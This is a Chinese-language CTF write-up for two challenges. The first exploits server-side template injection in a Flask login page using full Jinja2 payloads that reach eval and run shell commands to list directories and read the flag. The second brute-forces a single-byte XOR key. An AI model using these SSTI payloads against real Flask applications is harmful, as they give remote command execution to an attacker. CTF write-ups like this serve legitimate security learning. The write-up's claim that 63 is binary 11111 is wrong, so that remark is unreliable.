### 个人信息
选手名称：Icemouse

解题列表：

               web            <font style="color:#000000;">easy_flask</font>

<font style="color:#000000;">                misc             简单算数</font>

<font style="color:#000000;"></font>

<font style="color:#000000;"></font>

### <font style="color:#000000;">解题过程</font>
#### easy_flask
题目提示 猜测该网站用的是Flask框架

打开靶机后有个登录页面 提示要输入用户名

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737096628973-3378a9dd-8e15-4acc-867a-39c7a7aa29a9.png)

随便输入个admin去尝试

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737096712716-31094b9b-8423-4913-ad05-c2b0aa569f77.png)

看到地址接收user参数 尝试注入

```php
?user={{config}}
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737096822936-fb6c4ea7-a607-4d37-b004-ecd4c3bee564.png)

确定存在目标注入漏洞，于是构造payload 列出根目录下文件

```php
?user={%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}%20{%%20if%20c.__name__%20==%20%27catch_warnings%27%20%}%20{%%20for%20b%20in%20c.__init__.__globals__.values()%20%}%20{%%20if%20b.__class__%20==%20{}.__class__%20%}%20{%%20if%20%27eval%27%20in%20b.keys()%20%}%20{{%20b[%27eval%27](%27__import__(%22os%22).popen(%22ls%20/%22).read()%27)%20}}%20%20{%%20endif%20%}%20{%%20endif%20%}%20{%%20endfor%20%}%20{%%20endif%20%}%20{%%20endfor%20%}
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737096964983-78967cbe-86f8-42bf-96df-bb050337d426.png)

没有发现flag文件 接着列出网站目录下文件

```php
?user={%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}%20{%%20if%20c.__name__%20==%20%27catch_warnings%27%20%}%20{%%20for%20b%20in%20c.__init__.__globals__.values()%20%}%20{%%20if%20b.__class__%20==%20{}.__class__%20%}%20{%%20if%20%27eval%27%20in%20b.keys()%20%}%20{{%20b[%27eval%27](%27__import__(%22os%22).popen(%22ls%22).read()%27)%20}}%20%20{%%20endif%20%}%20{%%20endif%20%}%20{%%20endfor%20%}%20{%%20endif%20%}%20{%%20endfor%20%}
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737097067154-86a65806-809a-45cb-9b61-7c9fe08b8d54.png)

发现flag文件 接着构造payload读取flag

```php
?user={%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}%20{%%20if%20c.__name__%20==%20%27catch_warnings%27%20%}%20{%%20for%20b%20in%20c.__init__.__globals__.values()%20%}%20{%%20if%20b.__class__%20==%20{}.__class__%20%}%20{%%20if%20%27eval%27%20in%20b.keys()%20%}%20{{%20b[%27eval%27](%27__import__(%22os%22).popen(%22cat%20flag%22).read()%27)%20}}%20%20{%%20endif%20%}%20{%%20endif%20%}%20{%%20endfor%20%}%20{%%20endif%20%}%20{%%20endfor%20%}
```

得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737097127956-5b25f89d-9db5-4a25-b451-d0e7009f3a09.png)

#### 简单算数
题目提示和异或有关 打开文件后发现是一串奇怪的字符串

```php
ys~xdg/m@]mjkz@vl@z~lf>b
```

尝试将字符串进行异或处理 但是不清楚要和哪个数字异或 于是编写脚本先尝试300以内的数字

```php
import base64

s1 = list(b'ys~xdg/m@]mjkz@vl@z~lf>b')

for i in range(300):   # 进行穷举的数字可高可低
    result = ""
    for j in range(len(s1)):
        result += chr(s1[j] ^ i)
    print(result)
    print(i)
```

发现与数字63异或时 会出现flag字样 由于python终端有些符号没显示出来 但是我们已经确定异或数字为63   接着利用工具CyberChef解码

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737097499508-9a3c783a-1779-44a5-8127-03246b12d737.png)

由于63的二进制为11111 所以解码得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737097736779-0eba1a2a-4ef9-45c1-9714-22904e5350ae.png)



